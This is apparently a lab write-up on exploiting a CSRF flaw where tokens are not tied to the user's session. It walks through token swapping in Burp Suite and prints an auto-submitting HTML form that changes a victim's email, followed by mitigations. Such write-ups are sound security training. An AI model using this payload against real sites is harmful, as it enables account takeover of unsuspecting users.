# Lab Name
CSRF where token is not tied to user session

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Not Bound to User Session

## Objective
Exploit a CSRF vulnerability by using a valid CSRF token obtained from one user to perform an action on another user's account.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the request contains a CSRF token

5. Log in with another account and obtain a different CSRF token

6. Replace the original CSRF token with the token obtained from the second account

7. Send the modified request and observe that the request is accepted

8. Generate a CSRF PoC using the valid token from the second account

9. Upload the exploit to the Exploit Server

10. Deliver the exploit to the victim

11. When the victim visits the malicious page, the forged request is accepted because the application validates only the token value and does not bind it to the victim's session

## Payload Used

```html
<html>
  <body>
    <form action="https://0a5100ac04b0e34880a217f9006900b6-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
      <input type="hidden" name="csrf" value="aEQEB4p1zzAjQZ7v8GjpzPapyf6x8F1T">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the CSRF protection by using a valid CSRF token from another user session and changed the victim's email address.

## Impact
- Unauthorized account modifications
- Cross-user request forgery
- Account takeover opportunities
- User impersonation
- Failure of CSRF protection

## Mitigation
- Bind each CSRF token to the authenticated user's session
- Generate unique, unpredictable CSRF tokens per session
- Reject tokens that do not belong to the current user
- Validate Origin and Referer headers
- Use SameSite cookies for additional protection

## Learning
A CSRF token is only effective when it is uniquely tied to the authenticated user's session.
If the application accepts tokens generated for other users, attackers can reuse valid tokens to bypass CSRF protection and perform unauthorized actions.
